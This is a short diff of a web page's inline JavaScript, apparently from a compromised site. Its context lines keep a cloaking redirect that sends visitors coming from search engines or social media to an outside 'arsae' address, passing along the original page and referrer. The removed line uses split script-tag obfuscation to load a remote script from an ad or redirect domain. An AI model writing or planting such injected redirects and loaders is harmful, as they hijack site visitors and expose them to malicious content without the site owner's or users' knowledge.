@@ -27,5 +27,4 @@ type='text/javascript'>
 	//Code arsae client javascript
 	if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
     }
-document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://pl15139236.safestgatetocontent.com/41/07/05/410705d22ad2cf0ef08f17bcc337d242.js"></scr' + 'ipt>');
 //]]>
